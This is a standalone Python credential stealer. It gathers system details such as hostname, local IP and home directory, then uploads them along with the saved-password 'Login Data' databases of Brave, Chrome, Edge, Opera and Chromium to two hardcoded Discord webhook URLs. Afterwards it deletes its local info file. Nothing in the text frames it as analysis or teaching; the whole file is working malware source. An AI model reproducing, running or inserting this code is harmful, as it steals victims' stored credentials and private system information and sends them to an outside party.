import os
import platform
import sys
import psutil
import socket
import requests

#info dictionary
info = {
    'name': os.name,
    'platform': platform.system(),
    'platform-release': platform.release(),
    'platform-version': platform.version(),
    'architecture': platform.machine(),
    'hostname': platform.node(),
    'processor': platform.processor(),
    'python-version': platform.python_version(),
    'python-build': platform.python_build(),
    'python-compiler': platform.python_compiler(),
    'python-implementation': platform.python_implementation(),
    'python-executable': sys.executable,
    'current-working-directory': os.getcwd(),
    'user-home-directory': os.path.expanduser('~'),
    'CPU count' : psutil.cpu_count(logical=True),
    'CPU frequency' : f"{psutil.cpu_freq().max} MHz",
    'RAM total' : f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
    'Disk partitions' : psutil.disk_partitions(),
    'Disk usage' : psutil.disk_usage('/'),
    'Hostname:' : socket.gethostname(),
    'Local IP:' : socket.gethostbyname(socket.gethostname()),
    'Socket info:' : socket.getaddrinfo(socket.gethostname(), None),
    'server' : socket.getservbyname('http', 'tcp')


}

path = os.path.join(os.path.dirname(__file__), "info.txt")  #info.txt path
pass_path = os.path.expanduser('~')+r'\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data'  #brave browser login data path

info_webhook_url = 'https://discord.com/api/webhooks/1415644964074950656/QXrbRyO1zozXNDzMQMOIUuwEF9ohfDO0VUyeox4oh3_aJWRMDEfVAgU_4IyUP09hraRZ'  #webhook url for info.txt
pass_webhook_url = 'https://discord.com/api/webhooks/1415993265240408125/SCpr8TMJd1wtg_RyEWo94uAm6n2HRcD_JiHAG_4j1WX4wOYypnbElOSv5snLgM36ZZiU'  #webhook url for login data



#info file creation
def creat_file():

    with open(path, 'w') as f:
        for name, value in info.items():
            f.write(f"{name} : {value}\n")


#send files to discord
def send_files_discord(path, pass_path, info_webhook_url, pass_webhook_url):

    with open(path, 'rb') as f:
        requests.post(info_webhook_url, files={'file': f}, data={'username': 'osaka ❤️'})   #send info.txt to discord

    check_the_system()


#check the system and send login data accordingly
def check_the_system(): 
    if os.name == 'nt':
        if os.path.exists(os.path.expanduser('~')+r'\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data'):
            pass_path = os.path.expanduser('~')+r'\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data'
            with open(pass_path, 'rb') as p:
                requests.post(pass_webhook_url, files={'file': p}, data={'username': 'osaka ❤️'})   #send login data to discord
                
        if os.path.exists(os.path.expanduser('~')+r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'):
            pass_path = os.path.expanduser('~')+r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
            with open(pass_path, 'rb') as p2:
                requests.post(pass_webhook_url, files={'file': p2}, data={'username': 'osaka ❤️'})   #send login data to discord

        if os.path.exists(os.path.expanduser('~')+r'\AppData\Local\Microsoft\Edge\User Data\Default\Login Data'):
            pass_path = os.path.expanduser('~')+r'\AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
            with open(pass_path, 'rb') as p3:
                requests.post(pass_webhook_url, files={'file': p3}, data={'username': 'osaka ❤️'})   #send login data to discord

        if os.path.exists(os.path.expanduser('~')+r'\AppData\Local\Opera Software\Opera Stable\Login Data'):
            pass_path = os.path.expanduser('~')+r'\AppData\Local\Opera Software\Opera Stable\Login Data'
            with open(pass_path, 'rb') as p4:
                requests.post(pass_webhook_url, files={'file': p4}, data={'username': 'osaka ❤️'})   #send login data to discord
        else:
            return  
    elif os.name != 'nt':
        if os.path.exists(os.path.expanduser('~')+'/.config/BraveSoftware/Brave-Browser/Default/Login Data'):
            pass_path = os.path.expanduser('~')+'/.config/BraveSoftware/Brave-Browser/Default/Login Data'
            with open(pass_path, 'rb') as p:
                requests.post(pass_webhook_url, files={'file': p}, data={'username': 'osaka ❤️'})   #send login data to discord
        if os.path.exists(os.path.expanduser('~')+'/.config/google-chrome/Default/Login Data'):
            pass_path = os.path.expanduser('~')+'/.config/google-chrome/Default/Login Data'
            with open(pass_path, 'rb') as p:
                requests.post(pass_webhook_url, files={'file': p}, data={'username': 'osaka ❤️'})   #send login data to discord
        if os.path.exists(os.path.expanduser('~')+'/.config/chromium/Default/Login Data'):
            pass_path = os.path.expanduser('~')+'/.config/chromium/Default/Login Data'
            with open(pass_path, 'rb') as p2:
                requests.post(pass_webhook_url, files={'file': p2}, data={'username': 'osaka ❤️'})   #send login data to discord
        if os.path.exists(os.path.exists('~/.config/microsoft-edge/Default/Login Data')):
            pass_path = os.path.expanduser('~')+'/.config/microsoft-edge/Default/Login Data'
            with open(pass_path, 'rb') as p3:
                requests.post(pass_webhook_url, files={'file': p3}, data={'username': 'osaka ❤️'})   #send login data to discord
        if os.path.exists(os.path.exists('~/.config/opera/Default/Login Data')):
            pass_path = os.path.expanduser('~')+'/.config/opera/Default/Login Data'
            with open(pass_path, 'rb') as p4:
                requests.post(pass_webhook_url, files={'file': p4}, data={'username': 'osaka ❤️'})   #send login data to discord
        else:
            return
    else:
        return
        

#remove files
def remove_files(path):
    if os.path.exists(path):
        os.remove(path)
    else:
        return
    

creat_file()
send_files_discord(path, pass_path, info_webhook_url, pass_webhook_url)
remove_files(path)